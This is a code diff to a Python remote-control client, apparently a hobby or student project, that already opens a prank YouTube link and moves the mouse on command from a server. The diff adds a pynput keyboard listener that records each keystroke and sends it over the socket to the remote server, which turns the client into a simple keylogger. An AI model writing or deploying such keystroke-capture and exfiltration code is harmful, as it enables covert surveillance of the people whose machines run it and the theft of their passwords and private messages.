@@ -1,5 +1,6 @@
 import pyautogui
 from cliente import *
+from pynput.keyboard import Listener
 import webbrowser
 import random
 
@@ -10,6 +11,25 @@ class Client(Cliente):
         
     def enlace(self):
         webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ") #abrir enlace de youtube
+    
+    def captura(self,key):
+        tecla=str(key)
+        teclas=[]
+        teclas.append(tecla)
+        try:
+            datos = self.socketCliente.recv(1024).decode()
+            print(f"Servidor: {datos}")
+            if datos == "enlace":
+                self.enlace()
+            if datos == "raton":
+                self.raton()
+            
+        except:
+                print(datos)
+        try:
+            self.socketCliente.send(str(teclas).encode())
+        except:
+            self.socketCliente.send("".encode())
         
     def raton(self):
         self.size = []
@@ -26,19 +46,9 @@ class Client(Cliente):
         
     def run(self):
         self.socketCliente.connect((self.host, self.port))
-        while True:
-            try:
-                datos = self.socketCliente.recv(1024).decode()
-                print(f"Servidor: {datos}")
-                if datos == "enlace":
-                    self.enlace()
-                if datos == "raton":
-                    self.raton()
-            except:
-                pass
-            
+        with Listener (on_press=self.captura) as c:
+            c.join()
         
-         
 if __name__ == "__main__":
     cli = Client()
     cli.run()
